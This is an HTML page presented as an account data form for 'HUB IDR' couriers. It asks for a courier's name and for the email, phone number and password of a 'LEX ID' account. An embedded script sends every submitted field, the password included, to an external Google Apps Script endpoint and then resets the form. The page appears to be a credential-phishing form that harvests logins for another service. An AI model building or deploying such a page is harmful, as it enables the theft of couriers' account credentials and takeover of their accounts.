<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

    <title>Form data kurir HUB IDR</title>
  </head>
  <body>
    
   <div class="container-fluid mt-5 px-4">
     <h2>Data akun kurir HUB IDR</h2>
     <small class="form-text text-muted">Silahkan isi data akun kurir anda dengan benar.</small>
     <form action="" name="form-courier">
       <div class="form-group mt-4">
         <label for="name">Courier Name</label>
         <input type="text" class="form-control" name="name" id="name" required>
       </div>
       <div class="form-group">
         <label for="email">Email LEX ID</label>
         <input type="email" class="form-control" name="email" id="email" required>
       </div>
       <div class="form-group">
         <label for="phone">Phone Number LEX ID</label>
         <input type="text" class="form-control" name="phone" id="phone" required>
       </div>
       <div class="form-group">
         <label for="password">Password LEX ID</label>
         <input class="form-control" id="password" name="password" required data-toggle="password" type="password">
       </div>
       <button type="submit" class="btn btn-block btn-primary">Kirim</button>
     </form>
   </div>
	

    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
    <script src="bootstrap-password-toggler.min.js"></script>
    <script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycbx3nn3fp7ckkHzm7xiLfwDUNr_CZzUyy7_pRQ8eMyg3bhlpa_B1a9hLDImlfFippvje/exec';
      const form = document.forms['form-courier'];
      form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => {
                    form.reset()
                    //window.location = 'file:///C:/Users/kgxpress/Desktop/Mine/success.html';
                    console.log('Success!', response)
                })
                .catch(error => {
                    alert('Pesan anda gagal dikirim.');
                    form.reset()
                    console.error('Error!', error.message)
                })
            });
    </script>

</html>
